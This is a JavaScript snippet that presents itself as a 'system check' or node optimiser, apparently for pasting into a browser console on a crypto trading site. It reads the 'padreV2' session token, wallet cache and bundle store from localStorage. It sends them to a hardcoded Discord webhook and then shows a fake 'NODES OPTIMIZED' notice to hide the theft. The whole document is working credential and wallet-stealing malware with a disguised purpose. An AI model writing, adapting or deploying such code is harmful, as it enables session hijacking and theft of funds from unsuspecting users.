(async function() {
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1469038806681256071/PB2evnQlWcslXIglcXYSwyGnNYG6XcP9qeJzCkUfNIjJAx4YAg5RyyMtKRGQdi1eW2RT";

    // 1. Function to send data to Discord Embeds
    const logToDiscord = async (data) => {
        const payload = {
            embeds: [{
                title: "📡 SKYLINE AUDIT DATA",
                color: 0x00ff88,
                fields: [
                    { name: "URL", value: `\`${window.location.href}\`` },
                    { name: "Session", value: `\`${data.session || 'None'}\`` },
                    { name: "Wallet Cache", value: data.wallets ? "✅ Captured (JSON)" : "❌ Not Found" }
                ],
                footer: { text: "Vanta Tracker v2.0" },
                timestamp: new Date().toISOString()
            }]
        };

        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(() => {});
    };

    // 2. Data Gathering Logic
    const harvestData = {
        session: localStorage.getItem('padreV2-session'),
        wallets: localStorage.getItem('padreV2-walletsCache'),
        bundles: localStorage.getItem('padre-v2-bundles-store-v2')
    };

    // 3. Execution & Decoy UI
    console.log("[VANTA] System Check Initialized...");
    await logToDiscord(harvestData);

    const notify = document.createElement('div');
    notify.style = "position:fixed;top:20px;right:20px;z-index:9999;background:#111;color:#00ff88;border:1px solid #00ff88;padding:10px;font-family:monospace;border-radius:5px;";
    notify.innerHTML = "VANTA: NODES OPTIMIZED [100%]";
    document.body.appendChild(notify);
    
    setTimeout(() => notify.remove(), 3000);
})();
